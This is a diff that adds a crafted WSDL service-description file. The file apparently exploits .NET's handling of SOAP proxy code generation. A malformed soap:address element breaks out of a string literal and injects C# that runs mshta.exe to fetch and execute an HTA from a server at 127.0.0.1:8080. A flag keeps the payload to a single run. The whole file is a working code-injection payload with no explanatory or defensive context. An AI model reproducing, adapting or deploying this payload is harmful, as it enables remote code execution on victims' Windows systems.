@@ -1,0 +1,22 @@
+﻿<definitions
+    xmlns="http://schemas.xmlsoap.org/wsdl/"
+    xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
+    xmlns:suds="http://www.w3.org/2000/wsdl/suds"
+    xmlns:tns="http://schemas.microsoft.com/clr/ns/System"
+    xmlns:ns0="http://schemas.microsoft.com/clr/nsassem/Logo/Logo">
+    <portType name="PortType"/>
+    <binding name="Binding" type="tns:PortType">
+        <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
+        <suds:class type="ns0:Image" rootType="MarshalByRefObject"></suds:class>
+    </binding>
+    <service name="Service">
+        <port name="Port" binding="tns:Binding">
+            <soap:address location="http://127.0.0.1:8080?C:\Windows\System32\mshta.exe?http://127.0.0.1:8080/cmd.hta"/>
+                        <soap:address location=";
+                        if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
+                                System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
+                                System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
+                        } //"/>
+        </port>
+    </service>
+</definitions> 
